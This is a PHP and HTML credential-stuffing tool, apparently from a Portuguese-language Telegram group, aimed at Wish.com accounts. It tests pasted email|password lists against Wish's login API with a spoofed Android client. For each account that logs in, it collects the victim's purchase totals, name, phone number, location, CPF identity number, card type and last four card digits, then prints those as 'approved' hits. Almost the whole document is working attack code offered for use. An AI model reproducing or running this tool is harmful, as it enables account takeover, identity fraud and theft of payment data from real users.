<html>
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" type="text/css" href="estilo.css" />
    <title>CHECKER WISH</title>
  </head>

  <body>
    <header>
      <h1>CENTRAL OSCKLER</h1>
    </header>

    <section>
      <h1>CHECKER WISH</h1>
      <form method="post">
        <textarea name="lista"></textarea>
        <input type="submit" value="TESTAR">
      </form>
      <div class="aprovadas">
        APROVADAS
        <textarea readonly name="aprovadas" id="aprovadas"></textarea>
      </div>
      <div class="reprovadas">
        REPROVADAS
        <textarea readonly name="reprovadas" id="reprovadas"></textarea>
      </div>
    </section>

    <footer>
      <h1>Desenvolvido por: &emsp;<a href="https://t.me/Vyrgul">@vyrgul</a></h1>
      <h1>Canal OSCKLER: &emsp;<a href="https://t.me/osckler">@Osckler</a></h1>
      <h1>Grupo OSCKLER: &emsp;<a href="https://t.me/oscklersec">@OscklerSEC</a></h1>
    </footer>
  </body>
</html>

<?php
error_reporting(0);
set_time_limit(0);
function getStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

$lista = $_POST["lista"];

if (isset($lista)) {
  $linhas = explode("\r\n", $lista);

  foreach ($linhas as $linha) {
    list ($email, $senha) = explode ("|", $linha);

$ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://www.wish.com/api/email-login');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_HEADER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
  curl_setopt($ch, CURLOPT_VERBOSE, 1);
$cokies = curl_exec($ch);
$bsid = getStr($cokies, 'Set-Cookie: bsid=', ';');
$ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://www.wish.com/api/email-login');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_HEADER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
  curl_setopt($ch, CURLOPT_VERBOSE, 1);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'Host: www.wish.com',
  'Cookie: _xsrf="1"; _appLocale="pt_BR"; bsid="' . $bsid . '"; _timezone="8.0"; _timezone_id="Asia/Shanghai"',
  'User-Agent: Mozilla/5.0 (Linux; Android 4.4.4; GT-P5210 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Safari/537.36',
  'Connection: Keep-Alive',
  'Content-Type: application/x-www-form-urlencoded',
));


curl_setopt($ch, CURLOPT_POSTFIELDS, "email=" . $email . "&password=" . $senha . "&app_device_id=f42ab1f2-1a8e-32b4-ad80-74fd701b1967&_xsrf=1&_client=androidapp&_capabilities%5B%5D=2&_capabilities%5B%5D=3&_capabilities%5B%5D=4&_capabilities%5B%5D=6&_capabilities%5B%5D=7&_capabilities%5B%5D=9&_capabilities%5B%5D=11&_capabilities%5B%5D=12&_capabilities%5B%5D=13&_capabilities%5B%5D=15&_capabilities%5B%5D=18&_capabilities%5B%5D=21&_capabilities%5B%5D=24&_capabilities%5B%5D=25&_capabilities%5B%5D=28&_capabilities%5B%5D=35&_capabilities%5B%5D=37&_capabilities%5B%5D=39&_capabilities%5B%5D=40&_capabilities%5B%5D=43&_capabilities%5B%5D=46&_capabilities%5B%5D=47&_capabilities%5B%5D=49&_capabilities%5B%5D=50&_capabilities%5B%5D=51&_capabilities%5B%5D=52&_capabilities%5B%5D=53&_capabilities%5B%5D=55&_capabilities%5B%5D=56&_capabilities%5B%5D=57&_capabilities%5B%5D=58&_capabilities%5B%5D=59&_capabilities%5B%5D=60&_capabilities%5B%5D=61&_capabilities%5B%5D=62&_capabilities%5B%5D=64&_capabilities%5B%5D=65&_capabilities%5B%5D=66&_capabilities%5B%5D=67&_capabilities%5B%5D=68&_capabilities%5B%5D=69&_capabilities%5B%5D=71&_app_type=wish&_is_using_google_branded_android_pay=true&_riskified_session_token=0be52cb2-40ad-4600-9f7f-f59c5153a900&_threat_metrix_session_token=7625-892fffb6-f1cb-42a4-ae25-3163b9b1a7fa&advertiser_id=e8879d6d-dd0f-4689-8fae-24670fe75bc1&_version=4.11.5&app_device_model=GT-P5210");
$logar = curl_exec($ch);

if (stripos($logar, '"user"')) {
  $token1 = getStr($logar, 'sweeper_session=', ';');
  $token2 = getStr($logar, 'bsid=', ';');
  $token3 = getStr($logar, '"sweeper_uuid": "', '"');
  $tokens = array(
    "Cookie: sweeper_session= $token1;",
    "bsid= $token2;"
  );
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://www.wish.com/transaction');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_HTTPHEADER, $tokens);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_HEADER, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
  curl_setopt($ch, CURLOPT_VERBOSE, 1);
  $compras = curl_exec($ch);
  if (strpos($compras, '= [{"status": "')) {
    $qtd = substr_count($compras, '"product_id": "');
    if ($qtd > 1) {
      for ($i = 1; $i < $qtd + 1; $i++) {
        $preso = getStrc($compras, '", "total": ', ',', $i);
        if (empty($preso)) {
          $preso = "N/E";
        }

        $str.= "($i) " . $preso . "  ";
      }

      $comprass = "($qtd):";
    }
    elseif ($qtd = 1) {
      $preso = getStr($compras, '", "total": ', ',');
      $str.= "(1) " . $preso . "  ";
    }
  }
  else {
    $comprass = "Sem compras";
  }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.wish.com/api/settings/get');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
      'x-xsrftoken: 2|5a3faa38|4a9e2536721c556e37ceeee30ae06a8d|1531804323',
      'cookie: bsid=' . $token2 . '; sessionRefreshed_5b47e137cf9cfd7439c38c15=true; sweeper_session=' . $token1 . '; __utma=96128154.1907912247.1531792996.1531792996.1531801884.2; __utmc=96128154; __utmz=96128154.1531792996.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); cto_lwid=2f769954-8012-4ccf-b15d-6cc9ad5bc201; lastRskxRun=1531793033384; rCookie=2k2270e2f5uxycbdoqbak; rskxRunCookie=0; _xsrf=2|5a3faa38|4a9e2536721c556e37ceeee30ae06a8d|1531804323; G_ENABLED_IDPS=google; __stripe_mid=db9e0de8-ee3b-47e7-ac5a-a323442082c8; _ga=GA1.2.1907912247.1531792996; _gid=GA1.2.20633699.1531804932; _timezone=3; __stripe_sid=45c56ea1-86a9-4f0e-a045-8c0b30a302fa; sweeper_uuid=' . $token3 . ''
    ));
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
    $settings = curl_exec($ch);
    $nome = getStr($settings, ' "name": "', '"');
    $telefone = (int)getStr($settings, '"phone_number": "', '"');
    $pais = getStr($settings, '"country_code": "', '"');
    $cidade = getStr($settings, ', "city": "', '"');
    $estado = getStr($settings, ' "state": "', '"');
    $cpf = getStr($settings, '"identity_number": "', '"');
    if (strpos($settings, 'card_type')) {
      $tipocartao = getStr($settings, 'card_type": "', '"');
      $avs_check = getStr($settings, '"avs_postal_check_response": "', '"');
    }
    else {
      $tipocartao = "Sem cartão";
      $avs_check = "N/E";
    }

    $estado = utf8_encode($estado);
    $digto = getStr($settings, '"last_4_digits": "', '"');
    echo "<script>document.getElementById('aprovadas').innerHTML += '✅ APROVADA ➡ $email|$senha ➡ [  COMPRAS: $comprass $str] ➡ [ CARTÃO: $tipocartao ] ➡ [ DIGITOS: $digto ]  &emsp;#Vyrgul [Central Osckler]&#10;';</script>";
  }

  elseif (stripos($logar, '"msg": "O email ou senha est\u00e3o incorret')) {
    echo "<script>document.getElementById('reprovadas').innerHTML += '❎ REPROVADA => $email|$senha  &emsp;#Vyrgul [Central Osckler]&#10;';</script>";
  }

  elseif (stripos($logar, 'Por favor, conecte-se usando o Facebook')) {
    echo "<script>document.getElementById('reprovadas').innerHTML += '❎ REPROVADA => $email|$senha  &emsp;#Vyrgul [Central Osckler]&#10;';</script>";
  }

  else {
        echo "<script>document.getElementById('reprovadas').innerHTML += '❎ REPROVADA => $email|$senha  &emsp;#Vyrgul [Central Osckler]&#10;';</script>";
  }

  }
}

?>
